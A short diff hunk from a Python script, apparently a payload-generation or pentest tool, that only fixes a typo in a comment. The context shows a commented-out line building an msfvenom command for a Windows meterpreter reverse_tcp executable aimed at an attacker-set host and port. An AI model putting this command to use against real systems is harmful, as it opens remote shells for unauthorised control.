@@ -2,7 +2,7 @@
 import os
 import time
 
-#To include in futuer auto gen list
+#To include in future auto gen list
 #power = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f exe -o met.ps1"
 #
 
